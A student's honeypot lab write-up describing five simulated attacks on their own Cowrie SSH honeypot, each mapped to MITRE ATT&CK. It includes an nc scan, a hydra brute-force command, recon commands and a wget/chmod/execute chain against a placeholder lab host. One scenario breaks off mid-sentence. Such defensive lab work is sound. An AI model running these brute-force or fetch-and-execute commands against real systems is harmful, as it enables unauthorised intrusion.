# Attack scenarios

## Scenario 1: connect-only scan

This one happened right at the start of the lab while I was just testing the connection from my attacker VM Kali to my honeypot. I did not plan it as a scenario so I did not note the time or the command and I only found it later when I went looking in the `Cowrie log`. I think I used nc to just touch port 2222 and close it with no login and no typing but I do not remember the exact command so I am marking it as a guess.

Command I think I used:` nc -vz <vm-ip> 2222`

In the log I found session `de4f6c6abbeb` coming from my attacker VM Kali to port `2222` and it has only `2 `events. The first is the connect at`2026-10-31T00:31:18Z`in Cowrie log time and the second is the closed event about `4 milliseconds `later. The closed event itself says the connection was lost after `2 milliseconds`. There is no client version event and no login and no command so nothing happened except the knock on the door. I think this fits nc because a real ssh client would send its version first but that is only my guess and I have not checked it.

I did not note the true UTC time for this one. The Cowrie log time has the same` 5 hour shift` as the other scenarios so my calculation says it was about `2026-10-30T19:31` in true UTC but that is calculated and not noted.

Now if I try to map this to `MITRE ATT&CK` the number would be` T1595 (Active Scanning)` means a connection that only touches the port to see if it is open (`Label: SIMULATED.`)

---

## Scenario 2: brute force that fails

I started this after the whole setup was done so I turned both VMs on and turned Cowrie on and checked its status. Before the attack I disconnected the Bridged adapter of my attacker VM Kali and checked that only the host-only address was left. Then I came to my attacker VM Kali and started hydra from there against my own honeypot on port `2222`. I used the wordlists I made for users and passwords with a total of `20 users and 100 passwords` and that gives a total of `2000` planned attempts. I left the two accounts that the honeypot allows out of both lists on purpose so none of them could work and none of them worked in the system. Hydra tried them `4` at a time because I declared a max of `4 tasks per server`.

Command: `hydra -L users.txt -P pass.txt -s 2222 -t 4 ssh://<vm-ip>`

The time I noted before starting hydra was `2026-10-30T21:51:37Z `as per UTC and the time I noted just after it ended was around `2026-10-30T22:03:24Z.` Hydra ran about` 11 minutes` at around `185 tries per minute` and ended with the line 1 of 1 target completed and `0 valid password` found. During all this I was continuously monitoring Cowrie for the attempts and it was logging them all. The Cowrie log window time was `2026-10-31T02:51:37 to 2026-10-31T03:03:24` because my Debian VM is set to a timezone 5 hours ahead of UTC and the Cowrie log stamps follow that local time even though they end with a Z. I proved it with timedatectl which showed` 5 hours` between the local time and the universal time. My first filter used true UTC and found 0 sessions so I had to shift the window.

After all this I came up with the results of a total of 161 sessions with `2080 failed attempts `and 0 successful logins. Hydra planned 2000 tries but Cowrie logged `2080` and I think hydra retried some of them but I have not proven it. If I do the calculation that was about `13 tries` per session on average and that was pretty fast so I was curious and shocked too because I saw this for the first time in my own logs. Because this scenario has many sessions I identify it by the time window and not by one session ID.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1110 (Brute Force)`The scenario where I used hydra to do the attempts(`Label: SIMULATED.`)

---

## Scenario 3: brute force that succeeds

This time I logged in again using the normal ssh prompt from my attacker VM to my own honeypot on port `2222`. The account name was the allowed lab account. I entered the first `2` passwords wrong and at the `third` attempt I entered the right one and it worked so a successful brute force was logged in my Cowrie and I checked it. I typed the password by hand because I did not want the lab account and its password to go into `users.txt` and `pass.txt` for security reasons.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I think I made typing mistakes on my first try and that was the part that went wrong. I read the full event list of both sessions and the log shows that the first connection `927a2b4fbff1` had `3 failed logins` and then closed and the second connection `1f4f4ebf8204` had `1 failed login` and then closed and neither of them has a success. We are humans and make mistakes so that is normal. I did not remove them and they stay in the logs as proof. They are not part of this scenario.

The time I noted before starting was `2026-10-30T22:36:45Z` in true UTC and I ended and checked it again and it was `2026-10-30T22:38:01Z`. The Cowrie log window is `2026-10-31T03:36:45 to 2026-10-31T03:38:01` with the same `5 hour shift` as before because of the timezone of my Debian VM.

Then I came to Cowrie and checked my attempts with jq using a command and the session ID was `9ecf35dfcc82`. It shows `two failed logins` at `03:37:10` and `03:37:18` and then `one success` at `03:37:37` about `29 seconds` after the connect. After being sure it was logged and worked I just typed exit in my attacker VM and the session closed at `03:37:59` so it lasted about `51 seconds`. The major part that I think helped me was monitoring the log after my attempts to check if any of them worked or not and except the last one all failed.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1110 (Brute Force)` for the wrong passwords before the success and `T1078.003 (Valid Accounts: Local Accounts)` for the scenario where I used a valid account (`Label: SIMULATED.`)

---

## Scenario 4: recon after login

I came back to my attacker VM Kali and logged in again by hand to my own honeypot on port `2222` with the allowed lab account. This time I wanted to look around the system like an attacker does after getting in. The first try worked with `no failed logins` so this scenario starts at the login.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I typed `uname -a` first to see the system and the fake machine answered with a Linux kernel line. Then I typed `cat /proc/cpuinfo` to get the details of the CPU and it printed `two processors`. Then I typed `whoami` and it told me the name of my lab account. Then I typed `free -m` to check the memory and then `ps aux` to see the running processes. At last I typed `ls` and nothing printed so I tried once again and nothing printed again and then I typed `exit` and got out. All these answers are made up by Cowrie so none of it shows the real VM.

The time I noted before starting was `2026-10-30T23:13:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:17:11Z`. The Cowrie log window is

---

## Scenario 5: download and execute

I came back to my attacker VM Kali and started a small web server there that held a harmless script called `bins.sh`. I bound it to the host-only address only so it could never be reached from the Bridged side. In another tab I opened another shell and logged in by hand to my own honeypot with the lab account. My plan was to get the file onto my victim machine like an attacker would so I typed `wget` to fetch it but it failed and the error said `name resolution failed`. I was a little shocked that something broke and then I shifted my mood to investigation.

Command: `python3 -m http.server 8000 --bind <kali-ip>`

Command: `wget http://<kali-ip>:8000/bins.sh`

The web server window showed nothing so I knew the request never arrived. I made a plain request from Debian to the same server outside Cowrie and it worked and returned `37 bytes` so the network and the server were fine and the problem was inside Cowrie. I searched the code of Cowrie and found that the error text is written by its own wget command. Before it connects it checks the address and blocks every address that is not a public internet address. My lab address is private so it blocked mine. The `name resolution failed` line was a fake one shown by the Cowrie script because no lookup happened at all. I think this is a safety feature but that is my guess because I did not read the reason from the developers. I thought about changing Cowrie so the download would work but I did not do that because it would alter my real research and I am stating this honestly here.

My first try is session `94e82f308aaf` and it has only the `wget` and then `exit` so it is incomplete. The web server was on and saw nothing. It stays in the log as proof and it is not part of this scenario. For the record I tried again and typed `wget` then `chmod +x bins.sh` to make it executable and at last `./bins.sh` to run it like an attacker would. The web server was off for this second try and it is the scenario.

Command: `chmod +x bins.sh`

Command: `./bins.sh`

The time I noted before the second try was `2026-10-30T23:56:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:58:59Z`. The Cowrie log window is `2026-10-31T04:56:44 to 2026-10-31T04:58:59` with the same `5 hour shift` as before because of the timezone of my Debian VM.

Then I came to Cowrie and found one session in that window and the session ID was `4482296f8cb3`. It shows one successful login at `04:57:07` and `no failed logins`. After that it shows `4 commands` in this order: `wget`, `chmod +x bins.sh`, `./bins.sh` and `exit`. It shows one failed command event for `./bins.sh` and `no download event` at all so no file was captured. The session closed at `04:58:33` so it lasted about `93 seconds`. My activity was logged in Cowrie even though the download was blocked.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1105 (Ingress Tool Transfer)`. It failed because of the Cowrie rule but it was an attempt (`Label: SIMULATED.`)

---
